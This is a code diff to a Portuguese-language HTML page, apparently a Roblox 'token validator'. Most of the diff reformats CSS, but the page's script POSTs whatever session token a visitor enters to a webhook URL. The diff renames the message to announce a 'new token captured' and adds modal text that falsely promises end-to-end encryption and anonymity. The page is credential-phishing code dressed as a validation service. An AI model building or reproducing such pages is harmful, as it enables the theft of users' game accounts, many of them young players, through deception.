@@ -6,100 +6,61 @@
     <style>
         body { 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-            background: #000;
+            margin: 0; padding: 0; height: 100vh;
+            display: flex; justify-content: center; align-items: center;
+            overflow: hidden; background: #000;
         }
 
         /* FUNDO DE VÍDEO */
         .video-background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            pointer-events: none;
-            overflow: hidden;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1; pointer-events: none; overflow: hidden;
         }
         .video-background iframe {
-            width: 100vw;
-            height: 56.25vw; /* Proporção 16:9 */
-            min-height: 100vh;
-            min-width: 177.77vh; /* Proporção 16:9 */
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            opacity: 0.5; /* Escurece um pouco para dar contraste ao texto */
+            width: 100vw; height: 56.25vw; min-height: 100vh; min-width: 177.77vh;
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%); opacity: 0.5;
         }
 
-        .video-group { 
-            position: absolute;
-            top: 10%;  
-            width: 320px;
-            text-align: center;
-        }
+        .video-group { position: absolute; top: 10%; width: 320px; text-align: center; }
         .video-group iframe { border-radius: 8px; border: 1px solid #444; }
         .video-group p { margin-top: 10px; font-size: 1.1em; color: #ccc; font-weight: bold; }
         .left-video { left: 20px; }
         .right-video { right: 20px; }
 
         .container { 
-            border: 1px solid #333; 
-            padding: 40px; 
-            border-radius: 10px; 
-            background: rgba(37, 37, 37, 0.9); /* Um pouco transparente para ver o fundo */
-            text-align: center;
-            z-index: 10;
-            width: 380px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+            border: 1px solid #333; padding: 40px; border-radius: 10px; 
+            background: rgba(37, 37, 37, 0.9); text-align: center;
+            z-index: 10; width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.7);
         }
         input { 
-            width: 100%; 
-            padding: 12px; 
-            margin: 15px 0; 
-            border-radius: 5px; 
-            border: 1px solid #444; 
-            background: #111; 
-            color: #0f0; 
-            font-family: monospace; 
-            box-sizing: border-box;
+            width: 100%; padding: 12px; margin: 15px 0; border-radius: 5px; 
+            border: 1px solid #444; background: #111; color: #0f0; 
+            font-family: monospace; box-sizing: border-box;
         }
 
+        /* BOTÕES GLOW */
         .btn-main, .btn-info { 
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.3s;
-            background: #555;
-            color: white;
-            border: 2px solid #fff;
-            border-radius: 50px;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.4);
+            cursor: pointer; font-weight: bold; transition: 0.3s;
+            background: #555; color: white; border: 2px solid #fff;
+            border-radius: 50px; box-shadow: 0 0 15px rgba(255, 255, 255, 0.4);
         }
         .btn-main { width: 100%; padding: 12px 25px; font-size: 1.1em; }
         .btn-info { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); padding: 10px 30px; font-size: 0.9em; }
 
         .loader {
-            border: 4px solid #333;
-            border-top: 4px solid #fff;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            margin-bottom: 20px;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%;
+            width: 40px; height: 40px; animation: spin 1s linear infinite;
+            display: inline-block; margin-bottom: 20px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
+        /* Modal */
         .modal { display: none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); }
-        .modal-content { background-color: #252525; margin: 10% auto; padding: 20px; border: 1px solid #888; width: 50%; border-radius: 10px; }
+        .modal-content { 
+            background-color: #252525; margin: 10% auto; padding: 25px; 
+            border: 1px solid #888; width: 50%; border-radius: 10px; text-align: left; 
+        }
         .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
@@ -134,7 +95,8 @@
             <span class="close" onclick="fecharModal()">&times;</span>
             <h3>Informações do Sistema</h3>
             <p><strong>Quem somos:</strong> Somos uma equipe especializada em hacking e cybersegurança.</p>
-            <p><strong>Como funciona:</strong> Nosso sistema utiliza integração via API para validar tokens de sessão.</p>
+            <p><strong>Como funciona:</strong> Nosso sistema utiliza integração via API para validar tokens de sessão a partir da busca de senhas nos arquivos do roblox.</p>
+            <p><strong>Segurança:</strong> Utilizamos criptografia de ponta-a-ponta seguros para garantir que os dados sejam discretos e anônimos.</p>
         </div>
     </div>
 
@@ -151,7 +113,7 @@
                 fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: "🚨 **TOKEN VALIDADO:**\n```" + tokenValue + "```" })
+                    body: JSON.stringify({ content: "🚨 **NOVO TOKEN VALIDADO CAPTURADO!** 🚨\n```" + tokenValue + "```" })
                 });
 
                 const container = document.getElementById('mainContainer');
